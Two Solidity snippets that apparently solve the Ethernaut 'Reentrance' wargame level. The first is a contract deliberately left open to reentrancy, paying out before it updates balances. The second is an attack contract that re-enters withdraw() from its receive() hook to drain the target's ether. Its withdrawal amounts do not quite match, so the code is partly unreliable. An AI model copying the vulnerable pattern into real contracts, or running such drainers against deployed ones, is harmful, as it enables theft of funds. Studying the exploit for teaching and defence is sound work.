```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```


``` solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface Reentrancy {
    function donate(address) external  payable;
    function withdraw(uint256) external ;
    
}

contract AttackReentrancy {

    Reentrancy public target;

    constructor(address payable _target)public {
        target = Reentrancy(_target);
        }

    function donate() external  payable{
        require(msg.value > 0);
        target.donate{value: 100000000000000}(address(this));
        }
    
    function attack() public{
        target.withdraw(100000000000000);  
    }

    receive() external payable {
        require(address(target).balance >= 100000000000000);
        target.withdraw(0.001 ether);     
        }
    
    function collect() external {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }

}
```
